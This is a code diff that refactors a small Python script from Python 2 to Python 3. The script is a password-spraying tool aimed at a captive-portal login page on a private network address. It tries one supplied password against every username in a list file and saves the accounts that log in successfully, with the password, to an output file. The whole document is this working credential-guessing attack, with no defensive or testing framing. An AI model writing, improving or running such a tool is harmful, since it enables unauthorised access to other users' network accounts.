@@ -12,29 +12,30 @@ from sys import argv
 
 BASE_URL = "http://172.16.68.6:8090/login.xml"
 
-# BROWSERS_DICT = {"0": "", "1": "firefox", "2": "google-chrome"}
 
 def send_request(request_type, *arg):
-    if(request_type == 'login'):
+    if request_type == 'login':
         params = urlencode(
             {'mode': 191, 'username': arg[0], 'password': arg[1]})
-    elif(request_type == 'logout'):
-        print "Initiating logout request.."
+    elif request_type == 'logout':
+        print("Initiating logout request..")
         params = urlencode({'mode': 193, 'username': arg[0]})
 
     response = urlopen(BASE_URL, params)
     return response.read()
 
-if __name__ == "__main__":
 
+def main():
     p = argv[1]
-    fo=open("pass.txt","w")
-    with open('user.txt') as openfileobject:
-        for line in openfileobject:
-            line=line[:-1]
-            # p="hhttgg"
+    fo = open("ids.txt", "w")
+    with open('user.txt') as fob:
+        for line in fob:
+            line = line[:-1]
             data = send_request("login", line, p)
             if not "could not" in data:
-                fo.write(line+ " " + p + "\n")
-                print line + " found for given password.."
+                fo.write(line+" "+p+"\n")
+                print(line + " found for given password..")
     fo.close()
+
+if __name__ == "__main__":
+    main()
